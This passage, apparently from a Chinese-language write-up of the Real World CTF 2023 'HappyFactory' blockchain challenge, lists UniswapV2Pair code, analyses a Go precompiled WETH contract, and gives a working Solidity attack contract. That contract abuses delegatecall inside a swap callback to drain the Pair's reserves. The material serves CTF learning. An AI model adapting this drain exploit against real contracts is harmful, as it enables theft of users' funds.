_update(balance0, balance1, _reserve0, _reserve1);

emit Mint(msg.sender, amount0, amount1);

}

// this low-level function should be called from a contract which performs important safety checks

function burn(

address to

) external lock returns (uint256 amount0, uint256 amount1) {

(uint112 _reserve0, uint112 _reserve1, ) = getReserves();

address _token0 = token0;

address _token1 = token1;

uint256 balance0 = IERC20(_token0).balanceOf(address(this));

uint256 balance1 = IERC20(_token1).balanceOf(address(this));

uint256 liquidity = balanceOf(address(this));

uint256 _totalSupply = totalSupply();

amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution

amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution

require(

amount0 > 0 && amount1 > 0,

“UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED”

);

_burn(address(this), liquidity);

IERC20(token0).safeTransfer(to, amount0);

IERC20(token1).safeTransfer(to, amount1);

balance0 = IERC20(_token0).balanceOf(address(this));

balance1 = IERC20(_token1).balanceOf(address(this));

_update(balance0, balance1, _reserve0, _reserve1);

emit Burn(msg.sender, amount0, amount1, to);

}

// this low-level function should be called from a contract which performs important safety checks

function swap(

uint256 amount0Out,

uint256 amount1Out,

address to,

bytes calldata data

) external lock {

require(

amount0Out > 0 || amount1Out > 0,

“UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT”

);

(uint112 _reserve0, uint112 _reserve1, ) = getReserves();

require(

amount0Out < _reserve0 && amount1Out < _reserve1,

“UniswapV2: INSUFFICIENT_LIQUIDITY”

);

uint256 balance0;

uint256 balance1;

{

// scope for _token{0,1}, avoids stack too deep errors

address _token0 = token0;

address _token1 = token1;

require(to != _token0 && to != _token1, “UniswapV2: INVALID_TO”);

if (amount0Out > 0) IERC20(_token0).safeTransfer(to, amount0Out);

if (amount1Out > 0) IERC20(_token1).safeTransfer(to, amount1Out);

if (data.length > 0)

IUniswapV2Callee(to).uniswapV2Call(

msg.sender,

amount0Out,

amount1Out,

data

);

balance0 = IERC20(_token0).balanceOf(address(this));

balance1 = IERC20(_token1).balanceOf(address(this));

}

uint256 amount0In = balance0 > _reserve0 – amount0Out

? balance0 – (_reserve0 – amount0Out)

: 0;

uint256 amount1In = balance1 > _reserve1 – amount1Out

? balance1 – (_reserve1 – amount1Out)

: 0;

require(

amount0In > 0 || amount1In > 0,

“UniswapV2: INSUFFICIENT_INPUT_AMOUNT”

);

{

// scope for reserve{0,1}Adjusted, avoids stack too deep errors

uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));

uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));

require(

balance0Adjusted.mul(balance1Adjusted) >=

uint256(_reserve0).mul(_reserve1).mul(1000 ** 2),

“UniswapV2: K”

);

}

_update(balance0, balance1, _reserve0, _reserve1);

emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);

}

// force balances to match reserves

function skim(address to) external lock {

address _token0 = token0;

address _token1 = token1;

IERC20(_token0).safeTransfer(

to,

IERC20(_token0).balanceOf(address(this)) – reserve0

);

IERC20(_token1).safeTransfer(

to,

IERC20(_token1).balanceOf(address(this)) – reserve1

);

}

// force reserves to match balances

function sync() external lock {

_update(

IERC20(token0).balanceOf(address(this)),

IERC20(token1).balanceOf(address(this)),

reserve0,

reserve1

);

}

}

Copy

0x03 Analyse

清空Pair合约reserve即获胜

使用Golang实现了预编译合约，先来简单分析一下Go代码

篇幅有些长，直接上关键部分wrap.go

func transferAndCall(evm *vm.EVM, caller common.Address, input []byte, suppliedGas uint64, readOnly bool) (ret []byte, remainingGas uint64, err error) {

if readOnly {

return nil, suppliedGas, ErrWriteProtection

}

inputArgs := &TransferAndCallInput{}

if err = unpackInputIntoInterface(inputArgs, “transferAndCall”, input); err != nil {

return nil, suppliedGas, err

}

if ret, remainingGas, err = transferInternal(evm, suppliedGas, caller, inputArgs.To, inputArgs.Amount); err != nil {

return ret, remainingGas, err

}

code := evm.StateDB.GetCode(inputArgs.To)

if len(code) == 0 {

return ret, remainingGas, nil

}

snapshot := evm.StateDB.Snapshot()

evm.depth

defer func() { evm.depth– }()

if ret, remainingGas, err = evm.Call(vm.AccountRef(caller), inputArgs.To, inputArgs.Data, remainingGas, common.Big0); err != nil {

evm.StateDB.RevertToSnapshot(snapshot)

if err != ErrExecutionReverted {

remainingGas = 0

}

}

return ret, remainingGas, err

}

Copy

WETH ABI：

{ map[

allowance:function allowance(address owner, address spender) view returns(uint256) approve:function approve(address spender, uint256 amount) returns(bool)

balanceOf:function balanceOf(address account) view returns(uint256)

transfer:function transfer(address to, uint256 amount) returns(bool)

transferAndCall:function transferAndCall(address to, uint256 amount, bytes data) returns(bool) transferFrom:function transferFrom(address from, address to, uint256 amount) returns(bool)] map[] map[]  }

Copy

与常规ERC20不同，还实现了一个transferAndCall功能，顾名思义就是在转账的同时进行特定数据（data）的执行

在wrap.go中简单看一下可以发现evm.Call(vm.AccountRef(caller), inputArgs.To, inputArgs.Data, remainingGas, common.Big0)该语句中使用的caller就是调用者的地址拆分开来就是A trnsfer to B和A call data to B，这样来看的话我们如果让Pair合约能够主动的调用ETH和Token中的approve我们就可以实现清空Pair合约的余额

在swap函数中具有外部调用的功能，所以我们可以通过触发外部调用实现我们的目的，但是在外部调用之中调用weth的话的caller是攻击合约地址，关键之处就是在于构造caller为Pair合约地址

想到了delegatecall，将weth中的逻辑内容搬到外部调用的恶意函数中去，这是caller地址成功构造为Pair地址

有了这个思路我们构造出攻击合约进行漏洞利用即可

0x04 Attack

interface WETH{

function balanceOf(address account)external view returns(uint256) ;

function transfer(address to, uint256 amount)external returns(bool);

function transferAndCall(address to, uint256 amount, bytes calldata data)external  returns(bool);

function transferFrom(address from, address to, uint256 amount)external returns(bool);

function approve(address spender, uint256 amount)external returns(bool);

function allowance(address owner, address spender)external view returns(uint256);

}

contract attack{

WETH public weth = WETH(0x0000000000000000000000000000000000004eA1);

IERC20 public erc20;

UniswapV2Pair public pair;

// address _a,address _pair

constructor()payable{

erc20 = IERC20(0x82431c780e4204d42BF1b19AD964CD2fe715F2FD);

pair = UniswapV2Pair(0x651357d314662b28C3Db9A9902502633203CD06F);

}

function step() public {

pair.swap(1, 0, address(this), “0xdata”);

}

function uniswapV2Call(address a,uint b,uint c,bytes calldata d)public{

// (bool success,)=address(weth).delegatecall(abi.encodeWithSignature(“transferAndCall(address,uint256,bytes)”, address(weth),1,abi.encodeWithSignature(“approve(address,uint256)”, address(this),(uint)(int(-2)))));

//注释部分不可取，wrap.go中判断目标地址是否存在code，不存在将不会调用，实际上weth只是一个预编译合约，并不是一个真正存在在以太坊上的合约。

(bool success,)=address(weth).delegatecall(abi.encodeWithSignature(“approve(address,uint256)”,address(this),(uint)(int(-1))));

require(success,”fail”);

address(weth).delegatecall(abi.encodeWithSignature(“transferAndCall(address,uint256,bytes)”, address(erc20),1,abi.encodeWithSignature(“approve(address,uint256)”, address(this),(uint)(int(-1)))));

weth.transfer(address(pair),100);

}

function ok()public {

weth.transferFrom(address(pair),address(this),weth.balanceOf(address(pair)));

erc20.transferFrom(address(pair), address(this), erc20.balanceOf(address(pair)));

pair.sync();

}

receive()external payable{}

}

Copy

最终这道题只拿到了第十七解

Sum up

总结一下，RWCTF的题目感觉还是蛮有质量的，虽然实现了区块链方向的全解但是依旧觉得有些吃力，技术能力还有待提高。

原文始发于bcYng：real world ctf 2023 HappyFactory